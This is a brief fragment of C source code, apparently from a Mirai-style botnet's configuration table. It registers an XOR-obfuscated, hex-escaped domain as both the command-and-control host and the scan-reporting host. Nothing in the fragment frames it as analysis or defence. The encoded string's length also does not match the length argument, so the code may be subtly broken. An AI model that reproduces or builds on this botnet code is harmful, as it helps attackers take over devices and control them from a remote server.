...
{   
    ...
    add_entry(TABLE_CNC_DOMAIN, "\x77\x67\x65\x6A\x2A\x77\x65\x70\x71\x76\x6A\x66\x6B\x70\x6A\x61\x70\x2A\x6A\x61\x70\x04", 17); // 
    add_entry(TABLE_SCAN_DOMAIN, "\x77\x67\x65\x6A\x2A\x77\x65\x70\x71\x76\x6A\x66\x6B\x70\x6A\x61\x70\x2A\x6A\x61\x70\x04", 17); // 
